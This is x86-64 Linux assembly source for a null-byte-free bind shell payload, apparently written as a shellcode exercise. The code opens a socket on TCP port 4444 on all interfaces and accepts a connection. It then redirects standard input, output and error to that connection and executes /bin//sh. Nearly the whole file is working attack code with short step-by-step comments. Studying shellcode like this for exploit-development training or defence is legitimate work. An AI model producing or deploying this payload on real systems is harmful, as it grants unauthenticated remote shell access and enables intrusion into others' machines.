global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

    ; first set rax to 0
    ; then move the rax to the respective registers to ensure they are zeroed
    xor rax,rax
    mov rdi, rax
    mov rsi, rax
    mov rdx, rax
    add rdi, 2
    add rsi, 1
    add rax, 41
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax

	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11

    ; Get rid of nullbyte by making use of al
    xor rax, rax
    add al, 2
	mov byte [rsp-8], al 
	sub rsp, 8


	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

    xor rax, rax
	add rax, 49
	
	mov rsi, rsp
    ; Getting rid of nullbyte by xoring rdx and adding 16
    xor rdx, rdx
    add rdx, 16
	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50

    xor rax, rax
    mov rsi, rax
    add rax, 50
    add rsi, 2
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	
    xor rax, rax
    add rax, 43
	sub rsp, 16
	mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp

        syscall

	; store the client socket description 
	mov r9, rax 

        ; close parent

        xor rax, rax
        add rax, 3
        syscall

        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
        xor rax, rax
        add rax, 33
        xor rsi, rsi
        syscall

        xor rax, rax
        add rax, 33
        xor rsi, rsi
        inc rsi
        syscall

        xor rax, rax
        add rax, 33
        xor rsi, rsi
        add rsi, 2
        syscall

        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall







	






	
	

 
